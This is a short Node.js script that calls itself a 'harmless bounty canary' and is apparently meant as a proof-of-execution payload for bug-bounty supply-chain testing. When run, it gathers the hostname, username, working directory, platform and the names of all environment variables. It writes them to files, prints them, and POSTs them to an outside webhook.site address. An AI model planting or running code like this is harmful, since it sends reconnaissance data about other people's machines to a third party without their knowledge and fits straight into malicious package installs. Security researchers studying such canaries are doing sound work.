// Harmless bounty canary. Reports WHERE this code ran, nothing secret.
// Sends: stage, hostname, user, cwd, platform, and env variable NAMES only (no values).
var stage = process.argv[2] || process.env.ZQX_STAGE || 'require';
var os = require('os'), fs = require('fs'), https = require('https');
var info = {
  marker: 'ZQX-NOVUS-EXEC-7f3a91',
  stage: stage,
  host: os.hostname(),
  user: (os.userInfo && os.userInfo().username) || '',
  cwd: process.cwd(),
  platform: os.platform() + ' ' + os.release(),
  node: process.version,
  envNames: Object.keys(process.env).sort()
};
try { fs.writeFileSync('/tmp/zqx-novus-proof.txt', JSON.stringify(info)); } catch (e) {}
try { fs.writeFileSync('zqx-novus-proof.txt', JSON.stringify(info)); } catch (e) {}
console.log('ZQX-NOVUS-EXEC-7f3a91 stage=' + stage + ' host=' + info.host + ' user=' + info.user + ' cwd=' + info.cwd);
console.error('ZQX-NOVUS-EXEC-7f3a91 stderr stage=' + stage + ' host=' + info.host);
try {
  var body = JSON.stringify(info);
  var req = https.request('https://webhook.site/5122697e-d0ec-4188-8eec-edc095827474/node-' + stage,
    { method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) } },
    function (res) { res.resume(); });
  req.on('error', function (e) { console.error('ZQX-NOVUS-EXEC-7f3a91 egress-blocked ' + e.message); });
  req.write(body); req.end();
} catch (e) { console.error('ZQX-NOVUS-EXEC-7f3a91 egress-throw ' + e.message); }
